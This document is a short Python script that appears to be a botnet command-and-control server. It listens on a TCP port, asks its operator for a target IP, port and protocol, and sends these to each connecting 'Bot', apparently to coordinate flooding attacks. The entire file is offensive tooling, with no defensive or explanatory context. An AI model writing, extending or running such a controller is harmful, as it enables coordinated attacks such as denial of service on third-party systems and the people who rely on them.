import socket

IP = ""
PORT = 10242
ADDR = (IP, PORT)
SIZE = 1024
FORMAT = "utf-8"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Socket succesfully created')

s.bind((IP, PORT))
print(f'socket binded to port: {PORT}')

s.listen()
print('Socket is listening')

hostname = str("")
hostport = int(0)
proto = str("")
x = True

while True:
    if x == True:
        hostname = input("IP:")
        hostport = input("Port:")
        proto = input("Protocol:")
        x = False

    c, addr = s.accept()
    print(addr, "Bot Connected!")
    c.send(hostname.encode(FORMAT))
    print(addr, "Bot Got Hostname/IP")
    c.send(hostport.encode(FORMAT))
    print(addr, "Bot Got Port")
    c.send(proto.encode(FORMAT))
    print(addr, "Bot Got Protocol")
    c.close()
